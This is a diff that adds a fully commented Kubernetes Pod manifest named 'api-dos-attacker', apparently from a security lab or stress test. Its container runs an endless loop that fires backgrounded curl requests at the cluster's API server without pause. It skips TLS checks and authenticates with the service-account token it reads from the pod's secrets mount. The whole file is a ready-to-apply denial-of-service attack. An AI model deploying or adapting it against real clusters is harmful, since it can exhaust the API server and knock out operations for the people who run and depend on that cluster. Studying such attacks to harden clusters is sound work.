@@ -1,0 +1,28 @@
+apiVersion: v1                      # Specifies the API version for the Kubernetes object; "v1" is used for Pod resources.
+kind: Pod                           # Defines the type of Kubernetes object; in this case, it's a Pod.
+metadata:
+  name: api-dos-attacker            # The name of the pod, used to identify it in the cluster.
+  namespace: default                # The namespace in which this pod will be deployed; "default" is the standard namespace.
+spec:
+  nodeSelector:                     # Ensures this pod is scheduled on a specific node.
+    kubernetes.io/hostname: child2-alien  # Specifies that this pod must run on the node with the hostname "child2-alien".
+  containers:                       # Defines the containers that will run in this pod.
+    - name: dos-container           # The name of the container, used for identification within the pod.
+      image: appropriate/curl       # Specifies the container image to use; here, "appropriate/curl" provides the curl tool.
+      command:                      # Overrides the container's default command.
+        - "/bin/sh"                 # Specifies the shell to use for running commands.
+        - "-c"                      # Instructs the shell to execute the following string as a command.
+        - |
+          while true; do
+            curl -k https://kubernetes.default.svc/api --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" &
+          done                      # A shell script that runs an infinite loop sending requests to the Kubernetes API server.
+      securityContext:              # Configures security settings for the container.
+        runAsUser: 1000             # Specifies the user ID under which the container will run.
+        runAsGroup: 3000            # Specifies the group ID under which the container will run.
+      resources:                    # Specifies resource requests and limits for the container.
+        limits:                     # The maximum amount of resources this container can use.
+          cpu: "1"                  # Limits the container to 1 CPU core.
+          memory: "1Gi"             # Limits the container to 1 GiB of memory.
+        requests:                   # The minimum amount of resources this container requires.
+          cpu: "0.5"                # Guarantees the container 0.5 CPU core.
+          memory: "500Mi"           # Guarantees the container 500 MiB of memory.
